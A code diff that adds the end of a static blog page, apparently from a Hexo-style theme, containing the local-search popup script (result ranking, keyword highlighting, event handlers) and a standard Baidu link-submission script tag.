+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
